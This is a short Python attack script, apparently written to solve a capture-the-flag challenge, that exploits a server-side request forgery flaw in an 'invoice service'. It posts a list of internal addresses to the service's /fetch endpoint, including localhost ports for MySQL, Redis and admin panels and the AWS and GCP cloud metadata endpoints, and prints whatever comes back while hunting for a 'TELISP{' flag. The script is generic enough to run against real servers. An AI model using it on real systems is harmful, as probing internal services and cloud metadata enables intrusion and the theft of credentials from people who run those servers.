#!/usr/bin/env python3
import requests
import sys
import urllib.parse

def exploit_ssrf(url, target):
    """
    Exploit SSRF vulnerability in the invoice service
    """
    try:
        # Common internal services to try
        internal_targets = [
            'http://localhost:5000',  # Flask admin
            'http://localhost:3306',  # MySQL
            'http://localhost:6379',  # Redis
            'http://localhost:8080',  # Router UI
            'http://127.0.0.1:5000',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:6379',
            'http://127.0.0.1:8080',
            'http://admin.internal',
            'http://internal',
            'http://metadata.google.internal',  # GCP metadata
            'http://169.254.169.254',  # AWS metadata
        ]
        
        if target:
            internal_targets = [target]
            
        for internal_target in internal_targets:
            print(f"[*] Trying to access: {internal_target}")
            
            # Encode the target
            encoded_target = urllib.parse.quote(internal_target)
            
            # Send the request
            data = {
                'url': encoded_target,
                'type': 'invoice'
            }
            
            response = requests.post(f"{url}/fetch", json=data)
            
            # Check if we got the flag
            if "TELISP{" in response.text:
                print("[+] Success! Found flag:")
                print(response.text.split("TELISP{")[1].split("}")[0])
                return True
            elif response.status_code != 404:
                print(f"[+] Got response from {internal_target}:")
                print(response.text[:200])  # Print first 200 chars
                
        print("[-] No flag found in any response")
        return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf.py <target_url> [internal_target]")
        sys.exit(1)
        
    target_url = sys.argv[1]
    internal_target = sys.argv[2] if len(sys.argv) > 2 else None
    
    print("[*] Attempting SSRF attack...")
    exploit_ssrf(target_url, internal_target) 